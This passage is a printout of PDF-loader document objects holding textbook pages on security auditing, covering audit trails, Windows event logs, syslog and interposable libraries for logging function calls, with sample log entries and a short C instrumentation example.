anti-virus systems and intrusion \\n detection systems\\nn) records of transactions executed by users in applications\\nTable 18.3 Monitoring Areas Suggested in ISO 27002\\nM18_STAL0611_04_GE_C18.indd   578 10/11/17   3:10 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 580, 'page_label': '579'}, page_content=\"18.2 / SECURITY AUDIT TRAIL  579\\n(c) User log showing a chronological list of commands executed by users\\nApr 9 11:20:22 host1 AA06370: from=<user2@host2>, size=3355, class=0\\nApr 9 11:20:22 host1 AA06370: to=<user1@host1>, delay=00:00:02,stat=Sent\\nApr 9 11:59:51 host1 AA06436: from=<user4@host3>, size=1424, class=0\\nApr 9 11:59:52 host1 AA06436: to=<user1@host1>, delay=00:00:02, stat=Sent\\nApr 9 12:43:52 host1 AA06441: from=<user2@host2>, size=2077, class=0\\nApr 9 12:43:53 host1 AA06441: to=<user1@host1>, delay=00:00:01, stat=Sent\\nJan 27  17:14:04  host1  login: ROOT LOGIN console\\nJan 27  17:15:04  host1  shutdown: reboot by root\\nJan 27  17:18:38  host1  login: ROOT LOGIN console\\nJan 27  17:19:37  host1  reboot: rebooted by root\\nJan 28  09:46:53  host1  su: 'su root' succeeded for user1 on /dev/ttyp0\\nJan 28  09:47:35  host1  shutdown: reboot by user1\\nJan 28  09:53:24  host1  su: 'su root' succeeded for user1 on /dev/ttyp1\\nFeb 12  08:53:22  host1  su: 'su root' succeeded for user1 on /dev/ttyp1\\nFeb 17  08:57:50  host1  date: set by user1\\nFeb 17  13:22:52  host1  su: 'su root' succeeded for user1 on /dev/ttyp0\\nFigure 18.4 Examples of Audit Trails\\n(a) Sample system log file showing authentication messages\\n(b) Application-level audit record for a mail delivery system\\nrcp user1 ttyp0 0.02 secs Fri Apr 8 16:02\\nls user1 ttyp0 0.14 secs Fri Apr 8 16:01\\nclear user1 ttyp0 0.05 secs Fri Apr 8 16:01\\nrpcinfo user1 ttyp0 0.20 secs Fri Apr 8 16:01\\nnroff user2 ttyp2 0.75 secs Fri Apr 8 16:00\\nsh user2 ttyp2 0.02 secs Fri Apr 8 16:00\\nmv user2 ttyp2 0.02 secs Fri Apr 8 16:00\\nsh user2 ttyp2 0.03 secs Fri Apr 8 16:00\\ncol user2 ttyp2 0.09 secs Fri Apr 8 16:00\\nman user2 ttyp2 0.14 secs Fri Apr 8 15:57\\nsecurity threats and impacts. For example, for an e-mail application, an audit trail can \\nrecord sender and receiver, message size, and types of attachments. An audit trail for \\na database interaction using SQL (Structured Query Language) queries can record \\nthe user, type of transaction, and even individual tables, rows, columns, or data items \\naccessed.\\nFigure 18.4b is an example of an application-level audit trail for a mail delivery \\nsystem.\\nuSer-LeveL Audit trAiLS A user-level audit trail traces the activity of individual \\nusers over time. It can be used to hold a user accountable for his or her actions. Such \\naudit trails are also useful as input to an analysis program that attempts to define \\nnormal versus anomalous behavior.\\nA user-level audit trail can record user interactions with the system, such as \\ncommands issued, identification and authentication attempts, and files and resources \\naccessed. The audit trail can also capture the user’s use of applications.\\nM18_STAL0611_04_GE_C18.indd   579 10/11/17   3:10 PM\"),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 581, 'page_label': '580'}, page_content='580  CHAPTER 18 / SECURITY AUDITING\\nFigure 18.4c is an example of a user-level audit trail on a UNIX system.\\nphySicAL AcceSS Audit trAiLS Audit trails can be generated by equipment that \\ncontrols physical access and then transmits them to a central host for subsequent \\nstorage and analysis. Examples are card-key systems and alarm systems. NIST SP \\n800-12 lists the following as examples of the type of data of interest:\\n• The date and time the access was attempted or made should be logged, as \\nshould the gate or door through which the access was attempted or made, and \\nthe individual (or user ID) making the attempt to access the gate or door.\\n• Invalid attempts should be monitored and logged by noncomputer audit trails \\njust as they are for computer system audit trails. Management should be made \\naware if someone attempts to gain access during unauthorized hours.\\n• Logged information should also include attempts to add, modify, or delete \\nphysical access privileges (e.g., granting a new employee access to the building \\nor granting transferred employees access to their new office [and, of course, \\ndeleting their old access, as applicable]).\\n• As with system and application audit trails, auditing of noncomputer functions \\ncan be implemented to send messages to security personnel indicating valid or \\ninvalid attempts to gain access to controlled spaces. In order not to desensitize a \\nguard or monitor, all access should not result in messages being sent to a screen. \\nOnly exceptions, such as failed access attempts, should be highlighted to those \\nmonitoring access.\\nProtecting Audit Trail Data\\nRFC 2196 (Site Security Handbook, 1997) lists three alternatives for storing audit records:\\n• Read/write file on a host\\n• Write-once/read-many device (e.g., CD-ROM or DVD-ROM)\\n• Write-only device (e.g., a line printer)\\nFile system logging is relatively easy to configure and is the least resource inten-\\nsive. Records can be accessed instantly, which is useful for countering an ongoing \\nattack. However, this approach is highly vulnerable. If an attacker gains privileged \\naccess to a system, then the audit trail is vulnerable to modification or deletion.\\nA DVD-ROM or similar storage method is far more secure but less convenient. \\nA steady supply of recordable media is needed. Access may be delayed and not avail-\\nable immediately.\\nPrinted logs do provide a paper trail, but are impractical for capturing detailed \\naudit data on large systems or networked systems. RFC 2196 suggests that the paper \\nlog can be useful when a permanent, immediately available log is required even with \\na system crash.\\nProtection of the audit trail involves both integrity and confidentiality. Integrity is \\nparticularly important because an intruder may attempt to remove evidence of the intru-\\nsion by altering the audit trail. For file system logging, perhaps the best way to ensure \\nintegrity is the digital signature. Write-once devices, such as DVD-ROM or paper, auto-\\nmatically provide integrity. Strong access control is another measure to provide integrity.\\nM18_STAL0611_04_GE_C18.indd   580 10/11/17   3:10 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 582, 'page_label': '581'}, page_content='18.3 / IMPLEMENTING THE LOGGING FUNCTION  581\\nConfidentiality is important if the audit trail contains user information that is \\nsensitive and should not be disclosed to all users, such as information about changes \\nin a salary or pay grade status. Strong access control helps in this regard. An effective \\nmeasure is symmetric encryption (e.g., using AES [Advanced Encryption Standard] \\nor triple DES [Data Encryption Standard]). The secret key must be protected and \\nonly available to the audit trail software and subsequent audit analysis software.\\nNote that integrity and confidentiality measures protect audit trail data not only \\nin local storage but also during transmission to a central repository.\\n 18.3 IMPLEMENTING THE LOGGING FUNCTION\\nThe foundation of a security auditing facility is the initial capture of the audit data. \\nThis requires that the software include hooks, or capture points, that trigger the col-\\nlection and storage of data as preselected events occur. Such an audit collection or \\nlogging function is dependent on the nature of the software and will vary depending \\non the underlying operating system and the applications involved. In this section, \\nwe look at approaches to implementing the logging function for system-level and \\nuser-level audit trails on the one hand, and application-level audit trails on the other.\\nLogging at the System Level\\nMuch of the logging at the system level can be implemented using existing facili -\\nties that are part of the operating system. In this section, we look at the facility in \\nthe Windows operating system, then at the syslog facility found in UNIX operating \\nsystems.\\nWindoWS event Log An event in Windows Event Log is an entity that describes \\nsome interesting occurrence in a computer system. Events contain a numeric iden -\\ntification code, a set of attributes (task, opcode, level, version, and keywords), and \\noptional user-supplied data. Windows is equipped with three types of event logs:\\n• System event log: Used by applications running under system service accounts \\n(installed system services), drivers, or a component or application that has \\nevents that relate to the health of the computer system.\\n• Application event log : Events for all user-level applications. This log is not \\nsecured and it is open to any applications. Applications that log extensive infor-\\nmation should define an application-specific log.\\n• Security event log: The Windows Audit Log. This event log is for exclusive use \\nof the Windows Local Security Authority. User events may appear as audits if \\nsupported by the underlying application.\\nFor all of the event logs, or audit trails, event information can be stored in \\nan XML format. Table 18.4 lists the items of information stored for each event. \\n Figure\\xa018.5 is an example of data exported from a Windows system event log.\\nWindows allows the system user to enable auditing in nine different categories:\\n• Account logon e vents: User authentication activity from the perspective of \\nthe system that validated the attempt. Examples: authentication granted; \\nM18_STAL0611_04_GE_C18.indd   581 10/11/17   3:10 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 583, 'page_label': '582'}, page_content='582  CHAPTER 18 / SECURITY AUDITING\\nProperty values of an event that contains binary data The LevelName Windows software trace preproces-\\nsor (WPP) debug tracing field used in debug events \\nin debug channels\\nBinary data supplied by Windows Event Log Level that will be rendered for an event\\nChannel into which the rendered event is published Level of severity for an event\\nComplex data for a parameter supplied by the event \\nprovider\\nFormattedString WPP debug tracing field used in \\ndebug events in debug channels\\nComponentName WPP debug tracing field used in \\ndebug events\\nEvent message rendered for an event\\nComputer that the event occurred on Opcode that will be rendered for an event\\nTwo 128-bit values that can be used to find related \\nevents\\nThe activity or a point within an activity that the \\napplication was performing when it raised the event\\nName of the event data item that caused an error \\nwhen the event data was processed\\nElements that define an instrumentation event\\nData that makes up one part of the complex data \\ntype supplied by the event provider\\nInformation about the event provider that published \\nthe event\\nData for a parameter supplied by the event provider Event publisher that published the rendered event\\nProperty values of Windows software trace \\n preprocessor (WPP) events\\nInformation that will be rendered for an event\\nError code that was raised when there was an error \\nprocessing event data\\nThe user security identifier\\nA structured piece of information that describes \\nsome interesting occurrence in the system\\nSequenceNum WPP debug tracing field used in \\ndebug events in debug channels\\nEvent identification number SubComponentName WPP debug tracing field used \\nin debug events in debug channels\\nInformation about the process and thread in which \\nthe event occurred\\nInformation automatically populated by the system \\nwhen the event is raised or when it is saved into the \\nlog file\\nBinary event data for the event that caused an error \\nwhen the event data was processed\\nTask that will be rendered for an event\\nInformation about the process and thread the event \\noccurred in\\nTask with a symbolic value\\nFileLine WPP debug tracing field used in debug \\nevents in debug channels\\nInformation about the time the event occurred\\nFlagsName WPP debug tracing field used in debug \\nevents in debug channels\\nProvider-defined portion that may consist of any \\nvalid XML content that communicates event \\ninformation\\nKernelTime WPP debug tracing field used in debug \\nevents in debug channels\\nUserTime WPP debug tracing field used in debug \\nevents in debug channels\\nKeywords that will be rendered for an event Event version\\nKeywords used by the event\\nTable 18.4 Windows Event Schema Elements\\nM18_STAL0611_04_GE_C18.indd   582 10/11/17   3:10 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 584, 'page_label': '583'}, page_content='18.3 / IMPLEMENTING THE LOGGING FUNCTION  583\\nauthentication ticket request failed; account mapped for logon; account could \\nnot be mapped for logon. Individual actions in this category are not particu -\\nlarly instructive, but large numbers of failures may indicate scanning activity, \\nbrute-force attacks on individual accounts, or the propagation of automated \\nexploits.\\n• Account management : Administrative activity related to the creation, man -\\nagement, and deletion of individual accounts and user groups. Examples: user \\naccount created; change password attempt; user account deleted; security \\nenabled global group member added; domain policy changed.\\n• Directory service access: User-level access to any Active Directory object that \\nhas a System Access Control List defined. An SACL creates a set of users and \\nuser groups for which granular auditing is required.\\n• Logon events: User authentication activity, either to a local machine or over \\na network, from the system that originated the activity. Examples: successful \\nuser logon; logon failure, unknown username, or bad password; logon failure, \\nbecause account is disabled; logon failure, because account has expired; logon \\nfailure, user not allowed to logon at this computer; user logoff; logon failure, \\naccount locked out.\\n• Object access: User-level access to file system and registry objects that have \\nSystem Access Control Lists defined. Provides a relatively easy way to track \\nread access, as well as changes, to sensitive files, integrated with the operating \\nsystem. Examples: object open; object deleted.\\n• Policy changes: Administrative changes to the access policies, audit configura-\\ntion, and other system-level settings. Examples: user right assigned; new trusted \\ndomain; audit policy changed.\\n• Privilege use: Windows incorporates the concept of a user right, granular per-\\nmission to perform a particular task. If you enable privilege use auditing, you \\nrecord all instances of users exercising their access to particular system func -\\ntions (creating objects, debugging executable code, or backing up the system). \\nExamples: specified privileges were added to a user’s access token (during \\nlogon); a user attempted to perform a privileged system service operation.\\nEvent Type: Success Audit\\nEvent Source: Security\\nEvent Category: (1)\\nEvent ID: 517\\nDate: 3/6/2006\\nTime: 2:56:40 PM\\nUser: NT AUTHORITY[[backslash]]SYSTEM\\nComputer: KENT\\nDescription: The audit log was cleared\\nPrimary User Name: SYSTEM Primary Domain: NT AUTHORITY\\nPrimary Logon ID: (0x0,0x3F7) Client User Name: userk\\nClient Domain: KENT Client Logon ID: (0x0,0x28BFD)\\nFigure 18.5 Windows System Log Entry Example\\nM18_STAL0611_04_GE_C18.indd   583 10/11/17   3:10 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 585, 'page_label': '584'}, page_content='584  CHAPTER 18 / SECURITY AUDITING\\n• Process tracking: Generates detailed audit information when processes start \\nand finish, programs are activated, or objects are accessed indirectly. Examples: \\nnew process was created; process exited; auditable data was protected; auditable \\ndata was unprotected; user attempted to install a service.\\n• System events: Records information on events that affect the availability and \\nintegrity of the system, including boot messages and the system shutdown \\n message. Examples: system is starting; Windows is shutting down; resource \\nexhaustion in the logging subsystem; some audits lost; audit log cleared.\\nSySLog Syslog is UNIX’s general-purpose logging mechanism found on all UNIX \\nvariants and Linux. It consists of the following elements:\\n• syslog(): An application program interface (API) referenced by several stan-\\ndard system utilities and available to application programs\\n• logger: A UNIX command used to add single-line entries to the system log\\n• /etc/syslog.conf: The configuration file used to control the logging and \\nrouting of system log events\\n• syslogd: The system daemon used to receive and route system log events \\nfrom syslog() calls and logger commands.\\nDifferent UNIX implementations will have different variants of the syslog facil-\\nity, and there are no uniform system log formats across systems. Chapter 25 examines \\nthe Linux syslog facility. Here, we provide a brief overview of some syslog-related \\nfunctions and look at the syslog protocol.\\nThe basic service offered by UNIX syslog is a means of capturing relevant \\nevents, a storage facility, and a protocol for transmitting syslog messages from other \\nmachines to a central machine that acts as a syslog server. In addition to these basic \\nfunctions, other services are available, often as third-party packages and in some cases \\nas built-in modules. NIST SP 800-92 (Guide to Computer Security Log Management, \\nSeptember 2006) lists the following as being the most common extra features:\\n• Robust filtering : Original syslog implementations allowed messages to be \\nhandled differently based on their facility and priority only; no finer-grained \\nfiltering was permitted. Some current syslog implementations offer more \\nrobust filtering capabilities, such as handling messages differently based on the \\nhost or program that generated a message, or a regular expression matching \\ncontent in the body of a message. Some implementations also allow multiple \\nfilters to be applied to a single message, which provides more complex filter -\\ning capabilities.\\n• Log analysis: Originally, syslog servers did not perform any analysis of log data; \\nthey simply provided a framework for log data to be recorded and transmitted. \\nAdministrators could use separate add-on programs for analyzing syslog data. \\nSome syslog implementations now have limited log analysis capabilities built-in, \\nsuch as the ability to correlate multiple log entries.\\n• Event response: Some syslog implementations can initiate actions when certain \\nevents are detected. Examples of actions include sending SNMP traps, alerting \\nadministrators through pages or e-mails, and launching a separate program or \\nM18_STAL0611_04_GE_C18.indd   584 10/11/17   3:10 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 586, 'page_label': '585'}, page_content='18.3 / IMPLEMENTING THE LOGGING FUNCTION  585\\nscript. It is also possible to create a new syslog message that indicates that a \\ncertain event was detected.\\n• Alternative message formats: Some syslog implementations can accept data in \\nnon-syslog formats, such as SNMP traps. This can be helpful for getting security \\nevent data from hosts that do not support syslog and cannot be modified to \\ndo so.\\n• Log file encryption: Some syslog implementations can be configured to encrypt \\nrotated log files automatically, protecting their confidentiality. This can also be \\naccomplished through the use of OS or third-party encryption programs.\\n• Database storage for logs: Some implementations can store log entries in both \\ntraditional syslog files and a database. Having the log entries in a database \\nformat can be very helpful for subsequent log analysis.\\n• Rate limiting: Some implementations can limit the number of syslog messages \\nor TCP connections from a particular source during a certain period of time. \\nThis is useful in preventing a denial of service for the syslog server and the loss \\nof syslog messages from other sources. Because this technique is designed to \\ncause the loss of messages from a source that is overwhelming the syslog server, \\nit can cause some log data to be lost during an adverse event that generates an \\nunusually large number of messages.\\nThe syslog protocol provides a transport to allow a machine to send event \\nnotification messages across IP networks to event message collectors—also known \\nas syslog servers. Within a system, we can view the process of capturing and record-\\ning events in terms of various applications and system facilities sending messages to \\nsyslogd for storage in the system log. Because each process, application, and UNIX \\nOS implementation may have different formatting conventions for logged events, \\nthe syslog protocol provides only a very general message format for transmission \\nbetween systems. A common version of the syslog protocol was originally developed \\non the University of California Berkeley Software Distribution (BSD) UNIX/TCP/IP \\nsystem implementations. This version is documented in RFC 3164 (The BSD Syslog \\nProtocol, 2001). Subsequently, IETF issued RFC 5424 ( The Syslog Protocol 2009), \\nwhich is intended to be an Internet standard and which differs in some details from \\nthe BSD version. In what follows, we describe the BSD version.\\nMessages in the BSD syslog format consist of three parts:\\n• PRI: Consists of a code that represents the Facilities and Severity values of the \\nmessage, described subsequently.\\n• Header: Contains a timestamp and an indication of the hostname or IP address \\nof the device.\\n• Msg: Consists of two fields: The TAG field is the name of the program or process \\nthat generated the message; the CONTENT contains the details of the message. \\nThe Msg part has traditionally been a free-form message of printable characters \\nthat gives some detailed information of the event.\\nFigure 18.6 shows several examples of syslog messages, excluding the PRI part.\\nAll messages sent to syslogd have a facility and a severity (see Table 18.5). The \\nfacility identifies the application or system component that generates the message. \\nM18_STAL0611_04_GE_C18.indd   585 10/11/17   3:10 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 587, 'page_label': '586'}, page_content='586  CHAPTER 18 / SECURITY AUDITING\\nMar 1 06:25:43 server1 sshd[23170]: Accepted publickey for server2 from\\n172.30.128.115 port 21011 ssh2\\nMar 1 07:16:42 server1 sshd[9326]: Accepted password for murugiah from\\n10.20.30.108 port 1070 ssh2\\nMar 1 07:16:53 server1 sshd[22938]: reverse mapping checking getaddrinfo\\nfor ip10.165.nist.gov failed - POSSIBLE BREAKIN ATTEMPT!\\nMar 1 07:26:28 server1 sshd[22572]: Accepted publickey for server2 from\\n172.30.128.115 port 30606 ssh2\\nMar 1 07:28:33 server1 su: BAD SU kkent to root on /dev/ttyp2\\nMar 1 07:28:41 server1 su: kkent to root on /dev/ttyp2\\nFigure 18.6 Examples of Syslog Messages\\n(a) Syslog Facilities\\nFacility Message Description (generated by)\\nkern System kernel\\nuser User process\\nmail e-mail system\\ndaemon System daemon, such as ftpd\\nauth Authorization programs login, su, and getty\\nSyslogd Messages generated internally by syslogd\\nlpr Printing system\\nnews UseNet News system\\nuucp UUCP subsystem\\nclock Clock daemon\\nftp FTP deamon\\nntp NTP subsystem\\nlog audit Reserved for system use\\nlog alert Reserved for system use\\nLocal use 0–7 Up to 8 locally defined categories\\n(b) Syslog Severity Levels\\nSeverity Description\\nemerg Most severe messages, such as immediate system shutdown\\nalert System conditions requiring immediate attention\\ncrit Critical system conditions, such as failing hardware or software\\nTable 18.5 UNIX Syslog Facilities and Severity Levels\\n(Continued)\\nM18_STAL0611_04_GE_C18.indd   586 10/11/17   3:10 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 588, 'page_label': '587'}, page_content='18.3 / IMPLEMENTING THE LOGGING FUNCTION  587\\nSeverity Description\\nerr Other system errors; recoverable\\nwarning Warning messages; recoverable\\nnotice Unusual situation that merits investigation; a significant event that is typically \\npart of normal day-to-day operation\\ninfo Informational messages\\ndebug Messages for debugging purposes\\nTable 18.5 (Continued)\\nThe severity, or message level, indicates the relative severity of the message and can \\nbe used for some rudimentary filtering.\\nLogging at the Application Level\\nApplications, especially those with a certain level of privilege, present security problems \\nthat may not be captured by system-level or user-level auditing data. Application-level \\nvulnerabilities constitute a large percentage of reported vulnerabilities on security \\nmailing lists. One type of vulnerability that can be exploited is the all-too-frequent \\nlack of dynamic checks on input data, which make possible buffer overflow (see \\nChapter 10). Other vulnerabilities exploit errors in application logic. For example, \\na privileged application may be designed to read and print a specific file. An error \\nin the application might allow an attacker to exploit an unexpected interaction with \\nthe shell environment to force the application to read and print a different file, which \\nwould result in a security compromise.\\nAuditing at the system level does not provide the level of detail to catch appli-\\ncation logic error behavior. Further, intrusion detection systems look for attack \\nsignatures or anomalous behavior that would fail to appear with attacks based on \\napplication logic errors. For both detection and auditing purposes, it may be neces-\\nsary to capture in detail the behavior of an application, beyond its access to system \\nservices and file systems. The information needed to detect application-level attacks \\nmay be missing or too difficult to extract from the low-level information included in \\nsystem call traces and in the audit records produced by the operating system.\\nIn the remainder of this section, we examine two approaches to collecting audit \\ndata from applications: interposable libraries, and dynamic binary rewriting.\\nInterposable Libraries\\nA technique described in [KUPE99] and [KUPE04] provides for application-level \\nauditing by creating new procedures that intercept calls to shared library functions \\nin order to instrument the activity. Interposition allows the generation of audit data \\nwithout needing to recompile either the system libraries or the application of inter-\\nest. Thus, audit data can be generated without changing the system’s shared libraries \\nor needing access to the source code for the executable on which the interposition is \\nto be performed. This approach can be used on any UNIX or Linux variant and on \\nsome other operating systems.\\nM18_STAL0611_04_GE_C18.indd   587 10/11/17   3:10 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 589, 'page_label': '588'}, page_content='588  CHAPTER 18 / SECURITY AUDITING\\nThe technique exploits the use of dynamic libraries in UNIX. Before examining \\nthe technique, we provide a brief background on shared libraries.\\nShAred LibrArieS The OS includes hundreds of C library functions in archive \\nlibraries. Each library consists of a set of variables and functions that are compiled \\nand linked together. The linking function resolves all memory references to data and \\nprogram code within the library, generating logical, or relative, addresses. A function \\ncan be linked into an executable program, on demand, at compilation. If a function is \\nnot part of the program code, the link loader searches a list of libraries and links the \\ndesired object into the target executable. On loading, a separate copy of the linked \\nlibrary function is loaded into the program’s virtual memory. This scheme is referred \\nto as statically linked libraries.\\nA more flexible scheme, first introduced with UNIX System V Release 3, is \\nthe use of statically linked shared libraries . As with statically linked libraries, the \\nreferenced shared object is incorporated into the target executable at link time by \\nthe link loader. However, each object in a statically linked shared library is assigned \\na fixed virtual address. The link loader connects external referenced objects to their \\ndefinition in the library by assigning their virtual addresses when the executable is \\ncreated. Thus, only a single copy of each library function exists. Further, the function \\ncan be modified and remains in its fixed virtual address. Only the object needs to be \\nrecompiled, not the executable programs that reference it. However, the modifica -\\ntion generally must be minor; the changes must be made in such a way that the start \\naddress and the address of any variables, constants, or program labels in the code are \\nnot changed.\\nUNIX System V Release 4 introduced the concept of dynamically linked shared \\nlibraries. With dynamically linked libraries, the linking to shared library routines is \\ndeferred until load time. At this time, the desired library contents are mapped into \\nthe process’s virtual address space. Thus, if changes are made to the library prior to \\nload time, any program that references the library is unaffected.\\nFor both statically and dynamically linked shared libraries, the memory pages \\nof the shared pages must be marked read-only. The system uses a copy-on-write \\nscheme if a program performs a memory update on a shared page: The system assigns \\na copy of the page to the process, which it can modify without affecting other users \\nof the page.\\nthe uSe of interpoSAbLe LibrArieS Figure 18.7a indicates the normal mode of \\noperation when a program invokes a routine in dynamically linked shared libraries. \\nAt load time, the reference to routine foo in the program is resolved to the virtual \\nmemory address of the start of the foo in the shared library.\\nWith library interpolation, a special interposable library is constructed so at \\nload time, the program links to the interposable library instead of the shared library. \\nFor each function in the shared library for which auditing is to be invoked, the inter-\\nposable library contains a function with the same name. If the desired function is \\nnot contained in the interposed library, the loader continues its search in the shared \\nlibrary and links directly with the target function.\\nThe interposed module can perform any auditing-related function, such as \\nrecording the fact of the call, the parameters passed and returned, the return address \\nM18_STAL0611_04_GE_C18.indd   588 10/11/17   3:10 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 590, 'page_label': '589'}, page_content='18.3 / IMPLEMENTING THE LOGGING FUNCTION  589\\nFigure 18.7 The Use of an Interposable Library\\nApplication\\nprogram\\nInterposable\\nlibrary\\nCall foo()\\nFunction foo() Function foo()\\nShared\\nlibrary\\nCall foo()\\nShared\\nlibrary\\nApplication\\nprogram\\nCall foo()\\nFunction foo()\\n(a) Normal library call technique\\n(b) Library call with interposition\\nin the calling program, and so forth. Typically, the interposed module will call the \\nactual shared function (see Figure 18.7b) so that the application’s behavior is not \\naltered, just instrumented.\\nThis technique allows the interception of certain function calls and the storage \\nof state between such calls without requiring the recompilation of the calling program \\nor shared objects.\\nM18_STAL0611_04_GE_C18.indd   589 10/11/17   3:10 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 591, 'page_label': '590'}, page_content='590  CHAPTER 18 / SECURITY AUDITING\\n[KUPE99] gives an example of an interposable library function written in C \\n(see Figure 18.8). The function can be described as follows:\\n1. AUDIT_CALL_START (line 8) is placed at the beginning of every interposed \\nfunction. This makes it easy to insert arbitrary initialization code into each function.\\n2. AUDIT_LOOKUP_COMMAND (line 10 in Figure 18.8a, detail in Figure 18.8b) \\nperforms the lookup of the pointer to the next definition of the function in the \\nshared libraries using the dlsym(3x) command. The special flag RTLD_NEXT \\n(see Figure 18.8b, line 2), indicates that the next reference along the library search \\npath used by the run-time loader will be returned. The function pointer is stored \\nin fptr if a reference is found, or the error value is returned to the calling program.\\n3. Line 12 contains the commands that are executed before the function is called.\\n4. In this case,  the interposed function executes the original function call and \\nreturns the value to the user (line 14). Other possible actions include the exami-\\nnation, recording, or transformation of the arguments; the prevention of the \\nactual execution of the library call; and the examination, recording, or trans -\\nformation of the return value.\\n5. Additional code could be inserted before the result is returned (line 16), but \\nthis example has none inserted.\\n1 /****************************************\\n2 * Logging the use of certain functions *\\n3 ****************************************/\\n4 char *strcpy(char *dst, const char *src) {\\n5  char *(*fptr)(char *,const char *); /* pointer to the real function */\\n6 char *retval; /* the return value of the call */\\n7\\n8 AUDIT_CALL_START;\\n9\\n10 AUDIT_LOOKUP_COMMAND(char *(*)(char *,const char *),“strcpy”,fptr,NULL);\\n11\\n12 AUDIT_USAGE_WARNING(“strcpy”);\\n13\\n14 retval=((*fptr)(dst,src));\\n15\\n16 return(retval);\\n17 }\\nFigure 18.8 Example of Function in the Interposed Library\\n(a) Function definition (items in all caps represent macros defined 